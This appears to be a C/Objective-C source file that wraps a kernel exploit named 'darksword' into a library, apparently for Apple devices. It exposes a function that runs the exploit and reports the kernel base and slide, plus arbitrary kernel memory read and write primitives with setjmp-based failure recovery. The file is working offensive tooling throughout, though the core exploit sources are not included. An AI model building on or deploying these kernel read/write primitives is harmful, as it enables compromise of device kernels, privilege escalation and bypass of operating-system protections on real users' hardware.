/*
 * Library entry wrapping patched darksword_cli_main + early_kread/write.
 * Upstream sources stay in third_party/ (gitignored).
 */

#import <Foundation/Foundation.h>
#include "darksword_lib.h"

#include <setjmp.h>
#include <stdio.h>
#include <string.h>

jmp_buf g_lumina_dsk_jmp;
int g_lumina_dsk_fail;

extern int darksword_cli_main(int argc, char *argv[]);
extern void early_kread(uint64_t where, void *read_buf, size_t size);
extern void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[0x20]);
extern uint64_t kernel_base;
extern uint64_t kernel_slide;

#define DSK_EARLY_LEN 0x20

static int g_ready;

int dsk_exploit_run(void)
{
    g_ready = 0;
    g_lumina_dsk_fail = 0;
    kernel_base = 0;
    kernel_slide = 0;

    if (setjmp(g_lumina_dsk_jmp) != 0) {
        fprintf(stderr, "[-] DS-K FAILURE longjmp code=%d\n", g_lumina_dsk_fail);
        g_ready = 0;
        return (g_lumina_dsk_fail != 0) ? g_lumina_dsk_fail : -1;
    }

    int rc = darksword_cli_main(0, NULL);
    if (rc != 0) {
        g_ready = 0;
        return rc;
    }

    if (kernel_base == 0) {
        fprintf(stderr, "[-] DS-K finished but kernel_base == 0\n");
        g_ready = 0;
        return -2;
    }

    g_ready = 1;
    printf("[+] dsk_exploit_run OK base=%#llx slide=%#llx\n",
           (unsigned long long)kernel_base,
           (unsigned long long)kernel_slide);
    return 0;
}

int dsk_is_ready(void)
{
    return g_ready;
}

uint64_t dsk_kernel_base(void)
{
    return kernel_base;
}

uint64_t dsk_kernel_slide(void)
{
    return kernel_slide;
}

int dsk_early_kread(uint64_t kaddr, void *out, size_t len)
{
    if (!g_ready || out == NULL || len == 0) {
        return -1;
    }

    uint8_t *dst = out;
    size_t off = 0;
    while (off < len) {
        size_t chunk = len - off;
        if (chunk > DSK_EARLY_LEN) {
            chunk = DSK_EARLY_LEN;
        }
        /* early_kread FAILURE longjmps out of the process path — caller should
         * only use after successful exploit_run. Chunked reads for API shape. */
        uint8_t tmp[DSK_EARLY_LEN];
        memset(tmp, 0, sizeof(tmp));
        if (setjmp(g_lumina_dsk_jmp) != 0) {
            g_ready = 0;
            return -1;
        }
        early_kread(kaddr + off, tmp, chunk);
        memcpy(dst + off, tmp, chunk);
        off += chunk;
    }
    return 0;
}

int dsk_early_kwrite(uint64_t kaddr, const void *in, size_t len)
{
    if (!g_ready || in == NULL || len == 0) {
        return -1;
    }

    /* Upstream early_kwrite32bytes always writes 0x20 bytes; for partial
     * lengths, read-modify-write one window. Larger lens: loop windows. */
    const uint8_t *src = in;
    size_t off = 0;
    while (off < len) {
        uint8_t window[DSK_EARLY_LEN];
        if (setjmp(g_lumina_dsk_jmp) != 0) {
            g_ready = 0;
            return -1;
        }
        early_kread(kaddr + off, window, DSK_EARLY_LEN);
        size_t chunk = len - off;
        if (chunk > DSK_EARLY_LEN) {
            chunk = DSK_EARLY_LEN;
        }
        memcpy(window, src + off, chunk);
        if (setjmp(g_lumina_dsk_jmp) != 0) {
            g_ready = 0;
            return -1;
        }
        early_kwrite32bytes(kaddr + off, window);
        off += chunk;
    }
    return 0;
}
